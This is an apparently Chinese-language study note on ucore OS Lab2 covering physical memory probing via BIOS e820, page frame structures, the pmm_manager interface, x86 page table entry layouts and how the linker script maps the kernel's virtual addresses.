title="Lab2"></a>Lab2</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><h3 id="1-探测系统物理内存布局"><a href="#1-探测系统物理内存布局" class="headerlink" title="1.探测系统物理内存布局"></a>1.探测系统物理内存布局</h3><ul><li>当 ucore 被启动之后，最重要的事情就是知道还有多少内存可用，一般来说，获取内存大小的方法由 BIOS 中断调用和直接探测两种。但BIOS 中断调用方法是一般只能在实模式下完成，而直接探测方法必须在保护模式下完成。通过 BIOS 中断获取内存布局有三种方式，都是基于INT 15h中断，分别为88h e801h e820h。但是 并非在所有情况下这三种方式都能工作。在 Linux kernel 里，采用的方法是依次尝试这三 种方法。而在本实验中，我们通过e820h中断获取内存信息。因为e820h中断必须在实模式下使用，所以我们在 bootloader 进入保护模式之前调用这个 BIOS 中断，并且把 e820 映 射结构<strong>保存在物理地址0x8000</strong>处。</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab2/lab2_3_5_probe_phymem_methods.html">INT 15h调用</a>完成后, 将返回值存入一个结构体中:</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">e820map</span> &#123;</span><br><span class="hljs-keyword">int</span> nr_map;<span class="hljs-comment">//四字节, map中的元素个数</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> addr;<span class="hljs-comment">// 可用内存的起始地址</span><br>        <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<span class="hljs-comment">// 内存块大小</span><br>        <span class="hljs-keyword">long</span> type;    <span class="hljs-comment">// 四字节, 某块内存的属性。1标识可被使用内存块；2表示保留的内存块，不可映射</span><br>    &#125; <span class="hljs-built_in">map</span>[E820MAX];<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>​    存入的过程为:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">probe_memory:<br>    movl $0, 0x8000   # 初始化，向内存地址0x8000，即uCore结构e820map中的成员nr_map中写入0<br>    xorl %ebx, %ebx   # 初始化%ebx为0，这是int 0x15的其中一个参数<br>    movw $0x8004, %di # 初始化%di寄存器，使其指向结构e820map中的成员数组map<br>start_probe:<br>    movl $0xE820, %eax  # BIOS 0x15中断的子功能编号 %eax == 0xE820<br>    movl $20, %ecx    # 存放地址范围描述符的内存大小，至少20<br>    movl $SMAP, %edx  # 签名， %edx == 0x534D4150h(&quot;SMAP&quot;字符串的ASCII码)<br>    int $0x15     # 调用0x15中断<br>    jnc cont      # 如果该中断执行失败，则CF标志位会置1，此时要通知UCore出错<br>    movw $12345, 0x8000 # 向结构e820map中的成员nr_map中写入特殊信息，报告当前错误<br>    jmp finish_probe    # 跳转至结束，不再探测内存<br>cont:<br>    addw $20, %di   # 如果中断执行正常，则目标写入地址就向后移动一个位置<br>    incl 0x8000     # e820::nr_map++<br>    cmpl $0, %ebx   # 执行中断后，返回的%ebx是原先的%ebx加一。如果%ebx为0，则说明当前内存探测完成<br>    jnz start_probe<br>finish_probe:<br></code></pre></div></td></tr></table></figure><p><code>edata</code>表示<code>kernel</code>的<code>data</code>段结束地址；<code>end</code>表示<code>bss</code>段的结束地址（即整个<code>kernel</code>的结束地址）</p><p><code>edata[]</code>和 <code>end[]</code>这些变量是ld根据kernel.ld链接脚本生成的全局变量，表示相应段的结束地址，它们不在任何一个.S、.c或.h文件中定义，但仍然可以在源码文件中使用。</p><h3 id="2-管理物理-内存"><a href="#2-管理物理-内存" class="headerlink" title="2.管理物理 内存"></a>2.管理<em>物理</em> 内存</h3><ul><li>每一个物理页的属性用结构Page来表示</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> &#123;</span><br>    <span class="hljs-keyword">int</span> ref;        <span class="hljs-comment">// page frame&#x27;s reference counter</span><br>    <span class="hljs-keyword">uint32_t</span> flags; <span class="hljs-comment">// array of flags that describe the status of the page frame</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> property;<span class="hljs-comment">// the num of free *page*, used in first fit pm manager</span><br>    <span class="hljs-keyword">list_entry_t</span> page_link;<span class="hljs-comment">// free list link</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>而flag第一位和第二位(即bit 0 and bit 1, PG_reserved和PG_property的0和1是指第几位):</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Flags describing the status of a page frame */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PG_reserved                 0       <span class="hljs-comment">// the page descriptor is reserved for kernel or unusable</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PG_property                 1       <span class="hljs-comment">// the member &#x27;property&#x27; is valid (free or not)</span></span><br></code></pre></div></td></tr></table></figure><p>​    需要注意的是用到property成员变量的这个Page比较特殊，是这个连续内存空闲块地址<strong>最小的一页</strong>（即头一页， Head Page）,<br>​    用bit PG_property来enable</p><ul><li>使用btl指令置位某一个bit:</li></ul><blockquote><p>BTS %1,  %2     :先把%2对应的内存地址的第%1位的值填入cflags寄存器的CF，然后把该位<strong>置位</strong>)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SetPageReserved(page)       set_bit(PG_reserved, &amp;((page)-&gt;flags)) <span class="hljs-comment">//setbit使用的是内联汇编形式的btl指令</span></span><br></code></pre></div></td></tr></table></figure><ul><li>管理空闲块</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* free_area_t - maintains a doubly linked list to record free (unused) pages */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-keyword">list_entry_t</span> free_list;                                <span class="hljs-comment">// the list header</span><br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nr_free;                                 <span class="hljs-comment">// num of free pages in this free list</span><br>&#125; <span class="hljs-keyword">free_area_t</span>;<br></code></pre></div></td></tr></table></figure><ul><li>pmm_manager(): 一个函数指针列表, 用于引用管理内存的函数, 指向这个结构体的指针也是<code>pmm_manager</code><br>项目定义了一个<code>default_pmm_manager</code>, 每一个函数指向的具体函数定义在default_pmm_init.c中, 将此结构体地址赋值给<br>(pmm_manager *)pmm_manager, 可以更改为其他内存分配算法</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pmm_manager</span> &#123;</span><br>            <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name; <span class="hljs-comment">//物理内存页管理器的名字</span><br>            <span class="hljs-keyword">void</span> (*init)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//初始化内存管理器</span><br>            <span class="hljs-keyword">void</span> (*init_memmap)(struct Page *base, <span class="hljs-keyword">size_t</span> n); <span class="hljs-comment">//初始化管理空闲内存页的数据结构</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *(*<span class="hljs-title">alloc_pages</span>)(<span class="hljs-title">size_t</span> <span class="hljs-title">n</span>);</span> <span class="hljs-comment">//分配n个物理内存页</span><br>            <span class="hljs-keyword">void</span> (*free_pages)(struct Page *base, <span class="hljs-keyword">size_t</span> n); <span class="hljs-comment">//释放n个物理内存页</span><br>            <span class="hljs-keyword">size_t</span> (*nr_free_pages)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//返回当前剩余的空闲页数</span><br>            <span class="hljs-keyword">void</span> (*check)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//用于检测分配/释放实现是否正确的辅助函数</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li><code>kern_init()</code>中<code>pmm_init()</code>的==<code>page_init()</code>==部分内容</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// code above is traverse all memmap(e820map) to search the maxpa and print the memmap out</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> end[];<br><br><span class="hljs-comment">// calc the sum of pages</span><br>npage = maxpa / PGSIZE;<br><span class="hljs-comment">// </span><br>pages = (struct Page *)ROUNDUP((<span class="hljs-keyword">void</span> *)end, PGSIZE);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; npage; i ++) &#123;<br>SetPageReserved(pages + i);<br>&#125;<br><br><span class="hljs-keyword">uintptr_t</span> freemem = PADDR((<span class="hljs-keyword">uintptr_t</span>)pages + <span class="hljs-keyword">sizeof</span>(struct Page) * npage);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*    SetPageReserved只需把物理地址对应的Page结构中的flags标志设置为PG_reserved ，表示这些</span><br><span class="hljs-comment">*页已经被使用了，将来不能被用于分配。</span><br><span class="hljs-comment">*    而init_memmap函数则是把空闲物理页对应的Page结构中的flags和引用计数ref清零，并加到</span><br><span class="hljs-comment">*free_area.free_list指向的双向列表中，为将来的空闲页管理做好初始化准备工作。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// code below corrects free physical blocks&#x27; boundaries and initialized </span><br><span class="hljs-comment">// page(not page table), adding page to freelist.</span><br><span class="hljs-comment">// then, all physical pages&#x27; info are stored in base address (struct Page *)pages.</span><br><span class="hljs-comment">// page(s) can be accessed by `struct Page *pages;`, just like array.</span><br></code></pre></div></td></tr></table></figure><h3 id="3-内存空间布局"><a href="#3-内存空间布局" class="headerlink" title="3.内存空间布局"></a>3.内存空间布局</h3><ul><li><p>在uCore中，CPU先在bootasm.S（实模式）中通过调用BIOS中断，将物理内存的相关描述符写入特定位置<code>0x8000</code>，然后读入kernel至物理地址<code>0x10000</code>、虚拟地址<code>0xC0000000</code>。</p></li><li><p>而kernel在<code>page_init</code>函数中，读取物理内存地址<code>0x8000</code>处的内存，查找最大物理地址，并计算出所需的<strong>页面数</strong>。虚拟页表<code>VPT(Virtual Page Table)</code>的地址紧跟<code>kernel</code>，其地址为4k对齐。虚拟地址空间结构如下所示：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * Virtual memory map:                                          Permissions</span><br><span class="hljs-comment"> *                                                              kernel/user</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     4G -----------&gt; +---------------------------------+</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |         Empty Memory (*)        |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     +---------------------------------+ 0xFB000000</span><br><span class="hljs-comment"> *                     |   Cur. Page Table (Kern, RW)    | RW/-- PTSIZE</span><br><span class="hljs-comment"> *     VPT ----------&gt; +---------------------------------+ 0xFAC00000</span><br><span class="hljs-comment"> *                     |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     KERNTOP ------&gt; +---------------------------------+ 0xF8000000</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |    Remapped Physical Memory     | RW/-- KMEMSIZE=896MB</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *     KERNBASE -----&gt; +---------------------------------+ 0xC0000000</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-comment"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span><br><span class="hljs-comment"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span><br><span class="hljs-comment"> *     there if desired.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * */</span><br></code></pre></div></td></tr></table></figure><p>完成<strong>物理内存页管理初始化工作</strong>后，其物理地址的分布空间如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">+----------------------+ &lt;- <span class="hljs-number">0xFFFFFFFF</span>(4GB)       ----------------------------  4GB<br>|  一些保留内存，例如用于|                                保留空间<br>|   32bit设备映射空间等  |<br>+----------------------+ &lt;- 实际物理内存空间结束地址 ----------------------------<br>|                      |<br>|                      |<br>|     用于分配的         |                                 可用的空间<br>|    空闲内存区域        |<br>|                      |<br>|                      |<br>|                      |<br>+----------------------+ &lt;- 空闲内存起始地址      ----------------------------  <br>|     VPT页表存放位置      |                                VPT页表存放的空间   (4MB左右)<br>+----------------------+ &lt;- bss段结束处           ----------------------------<br>|uCore的text、data、bss |                              uCore各段的空间<br>+----------------------+ &lt;- <span class="hljs-number">0x00100000</span>(1MB)       ---------------------------- 1MB<br>|       BIOS ROM       |<br>+----------------------+ &lt;- <span class="hljs-number">0x000F0000</span>(960KB)<br>|     16bit设备扩展ROM  |                             显存与其他ROM映射的空间<br>+----------------------+ &lt;- <span class="hljs-number">0x000C0000</span>(768KB)<br>|     CGA显存空间       |<br>+----------------------+ &lt;- <span class="hljs-number">0x000B8000</span>            ---------------------------- 736KB<br>|        空闲内存       |<br>+----------------------+ &lt;- <span class="hljs-number">0x00011000</span>(+4KB)          uCore header的内存空间<br>| uCore的ELF header数据 |<br>+----------------------+ &lt;-<span class="hljs-number">0x00010000</span>             ---------------------------- 64KB<br>|       空闲内存        |<br>+----------------------+ &lt;- 基于bootloader的大小          bootloader的<br>|      bootloader的   |                                    内存空间<br>|     text段和data段    |<br>+----------------------+ &lt;- <span class="hljs-number">0x00007C00</span>            ---------------------------- 31KB<br>|   bootloader和uCore  |<br>|      共用的堆栈       |                                 堆栈的内存空间<br>+----------------------+ &lt;- 基于栈的使用情况<br>|     低地址空闲空间    |<br>+----------------------+ &lt;-  <span class="hljs-number">0x00000000</span>           ---------------------------- 0KB<br></code></pre></div></td></tr></table></figure><p>易知，其页表地址之上的物理内存空间是空闲的（除去保留的内存），故将该物理地址之下的物理空间对应的页表全部设置为保留(reserved)。并将这些空闲的内存全部添加进页表项中。</p></li></ul><h3 id="4-分配算法实现"><a href="#4-分配算法实现" class="headerlink" title="4.分配算法实现"></a>4.分配算法实现</h3><blockquote><p>在default_pmm.c中</p><p>实现了最简单的first-fit, 其他算法为challenge</p></blockquote><h3 id="5-段页式存储管理"><a href="#5-段页式存储管理" class="headerlink" title="5.段页式存储管理"></a>5.段页式存储管理</h3><h4 id="总体框架、分页机制图"><a href="#总体框架、分页机制图" class="headerlink" title="总体框架、分页机制图"></a>总体框架、分页机制图</h4><img src="https://i.loli.net/2021/11/20/Uvnt9ZJfP32FMbr.png" alt="image-20211120231536312" style="zoom:67%;" /><p>Page Directory is 4Kbyte-alignd, 所以CR3给的32位地址其实低12位为0, 只要把32:12和Linear address的31:22拼成一个32位地址即可:</p><img src="https://i.loli.net/2021/11/23/YQoyfDqFVTZPs6C.png" alt="image-20211120233531488" style="zoom:67%;" /><h4 id="虚拟页表和页目录表结构"><a href="#虚拟页表和页目录表结构" class="headerlink" title=" 虚拟页表和页目录表结构"></a><span id="vpt&pdt"> </span>虚拟页表和页目录表结构</h4><p>每个<strong>页表项</strong>（PTE）都由一个32位整数来存储数据，其结构如下</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">      31-12      9-11     8    7    6   5   4      3    2   1   0<br>+<span class="hljs-params">--------------</span>+<span class="hljs-params">-------</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<br>|     Offset   | Avail | MBZ | PS | D | A | PCD | PWT | U | W | P |<br>+<span class="hljs-params">--------------</span>+<span class="hljs-params">-------</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<br></code></pre></div></td></tr></table></figure><ul><li>0 - <strong>P</strong>resent: 表示当前PTE所指向的物理页面是否驻留在内存中</li><li>1 - <strong>W</strong>riteable: 表示是否允许读写</li><li>2 - <strong>U</strong>ser: 表示该页的访问所需要的特权级。即User(ring 3)是否允许访问</li><li>3 - <strong>P</strong>age<strong>W</strong>rite<strong>T</strong>hough: 表示是否使用write through缓存写策略</li><li>4 - <strong>P</strong>age<strong>C</strong>ache<strong>D</strong>isable: 表示是否<strong>不对</strong>该页进行缓存</li><li>5 - <strong>A</strong>ccess: 表示该页是否已被访问过</li><li>6 - <strong>D</strong>irty: 表示该页是否已被修改</li><li>7 - <strong>P</strong>age<strong>S</strong>ize: 表示该页的大小</li><li>8 - <strong>M</strong>ust<strong>B</strong>e<strong>Z</strong>ero: 该位必须保留为0</li><li>9-11 - <strong>Avail</strong>able: 第9-11这三位并没有被内核或中断所使用，可保留给OS使用。</li><li>12-31 - Offset: 目标<strong>物理</strong>地址的高20位。</li></ul><p><strong>页目录表:</strong> </p><img src="https://i.loli.net/2021/11/23/9B45OFTQWedfhw1.png" alt="image-20211123104109784" style="zoom:80%;" /><table><thead><tr><th>Bit Position(s)</th><th>Contents</th></tr></thead><tbody><tr><td>0(P)</td><td>Present: must be 1 to reference a page table</td></tr><tr><td>1(R/W)</td><td>Read/write; if 0,writes may not be allowed to the 4-MByte region controlled by this entry (see Section 4.6)</td></tr><tr><td>2(U/S)</td><td>User/supervisor, if 0, user-mode accesses are not allowed to the 4-MByte region controlled by this entry (see Section 4.6)</td></tr><tr><td>3(PWT)</td><td>Page-level write-through; indirectly determines the memory type used to access the page table referenced by this entry (see Section 4.9)</td></tr><tr><td>4(PCD)</td><td>Page-level cache disable; indirectly determines the memory type used to access the page table referenced by this entry (see Section 4.9)</td></tr><tr><td>5(A)</td><td>Accessed; indicates whether this entry has been used for linear-address translation (see Section 4.8)</td></tr><tr><td>6</td><td>lgnored</td></tr><tr><td>7(PS)</td><td>lf CR4.PSE= 1, must be 0 (otherwise, this entry maps a 4-MByte page; see Table 4-4); otherwise, ignored</td></tr><tr><td>11:8</td><td>lgnored</td></tr><tr><td>31:12</td><td><strong>Physical address</strong> of 4-KByte aligned page table referenced by this entry</td></tr></tbody></table><h3 id="6-内存初始化函数pmm-init"><a href="#6-内存初始化函数pmm-init" class="headerlink" title="6.内存初始化函数pmm_init()"></a>6.内存初始化函数pmm_init()</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">pmm_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// 装在cr3的物理地址</span><br>    boot_cr3 = PADDR(boot_pgdir);<br>    <br>    init_pmm_manager();<br><br>    <span class="hljs-comment">// detect physical memory space in 0~KERNMSIZE, reserve already used memory,</span><br>    <span class="hljs-comment">// then use pmm-&gt;init_memmap to create free page list</span><br>    page_init();<br><br>    <span class="hljs-comment">// some simple check</span><br>    check_alloc_page();<br>    check_pgdir();<br>    <span class="hljs-keyword">static_assert</span>(KERNBASE % PTSIZE == <span class="hljs-number">0</span> &amp;&amp; KERNTOP % PTSIZE == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// recursively insert boot_pgdir in itself</span><br>    <span class="hljs-comment">// to form a virtual page table at virtual address VPT</span><br>    boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W;<br><br>    <span class="hljs-comment">// map all physical memory to linear memory with base linear addr KERNBASE</span><br>    <span class="hljs-comment">// linear_addr KERNBASE ~ KERNBASE + KMEMSIZE = phy_addr 0 ~ KMEMSIZE</span><br>    boot_map_segment(boot_pgdir, KERNBASE, KMEMSIZE, <span class="hljs-number">0</span>, PTE_W);<br><br>    <span class="hljs-comment">// map virtual_addr 0 ~ 4G = linear_addr 0 ~ 4G</span><br>    <span class="hljs-comment">// then set kernel stack (ss:esp) in TSS, setup TSS in gdt, load TSS</span><br>    gdt_init();<br><br>    <span class="hljs-comment">//now the basic virtual memory map(see memalyout.h) is established.</span><br>    <span class="hljs-comment">//check the correctness of the basic virtual memory map.</span><br>    check_boot_pgdir();<br>    print_pgdir();<br>    kmalloc_init();<span class="hljs-comment">//just print some words</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-链接脚本与地址映射"><a href="#7-链接脚本与地址映射" class="headerlink" title="7.链接脚本与地址映射"></a>7.链接脚本与地址映射</h3><ul><li><strong>edata[]和 end[]这些变量是ld根据kernel.ld链接脚本生成的全局变量，表示相应段的起始地址或结束地址等，它们不在任何一个.S、.c或.h文件中定义。</strong> </li><li><strong>逻辑地址或虚拟地址是可执行代码在编译的时候由链接器生成的</strong> </li><li>ucore内核的链接地址==ucore内核的虚拟地址；boot loader加载ucore内核用到的加载地址==ucore内核的物理地址。</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab2/lab2_3_7_phymemlab_concepts.html">-&gt;详见实验指导书&lt;-</a> </li></ul><h4 id="地址映射的四个阶段"><a href="#地址映射的四个阶段" class="headerlink" title="地址映射的四个阶段"></a>地址映射的四个阶段</h4><p>在lab2中，为了建立正确的地址映射关系，ld在链接阶段生成了ucore OS执行代码的虚拟地址，而bootloader与ucore OS协同工作，通过在运行时对地址映射的一系列“腾挪转移”，从计算机加电，启动段式管理机制，启动段页式管理机制，在段页式管理机制下运行这整个过程中，虚拟地址到物理地址的映射产生了多次变化，实现了最终的段页式映射关系：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span><br></code></pre></div></td></tr></table></figure><h4 id="最开始-链接脚本"><a href="#最开始-链接脚本" class="headerlink" title="最开始: 链接脚本"></a>最开始: 链接脚本</h4><p>tools/kernel.ld文件在lab1和lab2中的区别。在lab1中：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ENTRY(kern_init)<br><br>SECTIONS &#123;<br>            /* Load the kernel at this address: &quot;.&quot; means the current address */<br>            . = 0x100000;<br><br>            .text : &#123;<br>                       *(.text .stub .text.* .gnu.linkonce.t.*)<br>            &#125;<br></code></pre></div></td></tr></table></figure><p>这意味着在lab1中通过ld工具形成的ucore的起始虚拟地址从0x100000开始，注意：这个地址是虚拟地址。但由于lab1中建立的段地址映射关系为对等关系，所以ucore的物理地址也是从0x100000开始，而ucore的入口函数kern_init的起始地址。所以在lab1中虚拟地址、线性地址以及物理地址之间的映射关系如下：</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">lab1: virt <span class="hljs-keyword">addr</span> = linear <span class="hljs-keyword">addr</span> = phy <span class="hljs-keyword">addr</span><br></code></pre></div></td></tr></table></figure><p>在lab2中：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ENTRY(kern_entry)<br><br>SECTIONS &#123;<br>            /* Load the kernel at this address: &quot;.&quot; means the current address */<br>            . = 0xC0100000;<br><br>            .text : &#123;<br>                        *(.text .stub .text.* .gnu.linkonce.t.*)<br>            &#125;<br></code></pre></div></td></tr></table></figure><p>这意味着lab2中通过ld工具形成的ucore的起始虚拟地址从0xC0100000开始，注意：这个地址也是虚拟地址。入口函数为kern_entry函数（在kern/init/entry.S中）。这与lab1有很大差别。但其实在lab1和lab2中，bootloader把ucore都放在了起始物理地址为0x100000的物理内存空间。<strong>这实际上说明了ucore在lab1和lab2中采用的地址映射不同。lab2在不同阶段有不同的虚拟地址、线性地址以及物理地址之间的映射关系。</strong> 